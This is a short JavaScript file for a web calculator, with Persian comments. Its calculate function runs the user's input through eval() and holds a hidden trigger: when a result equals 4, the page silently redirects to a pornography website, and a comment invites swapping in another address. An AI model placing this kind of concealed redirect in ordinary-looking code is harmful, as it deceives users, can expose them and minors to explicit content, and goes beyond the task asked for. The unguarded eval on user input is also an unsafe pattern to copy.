function addToInput(value) {
                              const input = document.getElementById('input');
                              input.value += value;
                          }
                          
                          function calculate() {
                              const input = document.getElementById('input');
                              const resultValue = document.getElementById('resultValue');
                              try {
                                  const result = eval(input.value);
                                  input.value = result;
                                  resultValue.innerText = result;
                          
                                  // اگر نتیجه برابر با 4 بود، به آدرس مشخص شده بروید
                                  if (result === 4) {
                                      window.location.href = "https://www.pornhub.com/"; // آدرس سایت خود را اینجا وارد کنید
                                  }
                              } catch (error) {
                                  alert("محاسبه نامعتبر است! لطفاً ورودی را بررسی کنید.");
                                  clearInput();
                              }
                          }
                          
                          function clearInput() {
                              const input = document.getElementById('input');
                              const resultValue = document.getElementById('resultValue');
                              input.value = '';
                              resultValue.innerText = '0'; // بازنشانی نتیجه به 0
                          }
                          